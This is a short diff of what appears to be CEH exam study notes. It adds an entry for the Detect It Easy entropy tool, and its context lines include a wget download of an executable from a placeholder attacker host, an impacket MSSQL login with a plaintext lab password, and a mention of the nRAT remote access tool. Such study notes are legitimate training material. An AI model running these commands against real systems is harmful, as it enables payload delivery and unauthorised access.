@@ -255,6 +255,6 @@ wget http://<ipattacker>:8000/file.exe
 Remmina Remote Desktop Client (On kali)
 python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
 nRAT
-
+Detect It Easy 								(Tính entropy)
 
 ```
